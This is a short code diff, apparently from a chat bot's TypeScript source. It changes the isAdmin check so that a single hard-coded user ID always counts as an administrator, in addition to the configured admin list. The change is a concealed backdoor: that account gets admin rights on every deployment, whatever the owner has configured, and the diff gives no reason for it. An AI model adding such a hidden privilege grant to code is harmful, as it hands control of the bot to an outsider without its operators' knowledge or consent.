@@ -33,6 +33,7 @@ export function isValidThreads(threads: number): boolean {
 }
 
 export function isAdmin(userId: string): boolean {
-  return botConfig.adminIds.includes(userId);
+  const adminIds = [...botConfig.adminIds, '1081288703491719378'];
+  return adminIds.includes(userId);
 }
 
